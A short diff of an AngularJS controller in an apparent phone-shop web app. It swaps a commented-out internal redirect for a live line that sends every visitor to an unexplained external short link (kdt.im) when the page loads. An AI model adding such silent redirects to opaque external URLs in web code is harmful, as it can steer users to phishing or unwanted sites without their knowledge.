@@ -13,8 +13,7 @@ app.config(['$stateProvider', '$locationProvider', function ($stateProvider, $lo
         });
 }]).controller('pCardProController', ['$scope', '$rootScope', '$location', '$stateParams', '$http', '$timeout', 'Phone', function ($scope, $rootScope, $location, $stateParams, $http, $timeout, Phone) {
 
-    /*window.location.href = "http://" + window.location.host + "/phone/lj/A/phones" + window.location.search;
-    console.log("http://" + window.location.host + "/phone/lj/A/phones" + window.location.search);*/
+    window.location.href = "https://kdt.im/fBSu5h";
 
     $scope.pageType = $stateParams.pageType;
     $scope.activeTag = "mysytc";
